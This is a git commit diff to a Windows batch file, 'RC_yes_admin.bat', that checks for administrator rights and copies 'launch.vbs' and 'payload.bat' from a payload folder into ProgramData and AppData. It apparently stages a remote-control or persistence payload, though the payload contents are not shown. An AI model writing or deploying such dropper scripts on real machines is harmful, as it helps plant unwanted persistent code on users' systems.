5065ef1437c230480f45824fde2cf5c1b6a00061
Guest257351 <lukenicholls510@gmail.com>
2021-04-08 13:32:55 +0930

    updates

--- RC_yes_admin.bat
+++ RC_yes_admin.bat
@@ -1,4 +1,4 @@
-@echo off
+@echo on&cd /D "%~dp0"
     net session >nul 2>&1
     if %errorLevel% == 0 (
         goto AT
@@ -6,7 +6,8 @@
         goto no_admin
     )
     :AT
-copy "payload\launch.vbs" "C:\ProgramData" >nul
+echo %CD%
+copy payload\launch.vbs C:\ProgramData
 if exist "C:\ProgramData\launch.vbs" (echo [92msuccessfuly moved launch.vbs[0m) else (echo [31mfailed to move launch.vbs[0m)
 copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
 if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
@@ -17,7 +18,7 @@ choice
 if %errorlevel% equ 1 shutdown /g
 exit
 :no_admin
-echo [31merror, program needs administrator rights[0m
+echo echo [31merror, program needs administrator rights[0m
 echo.
 echo press any key to exit...
 pause >nul
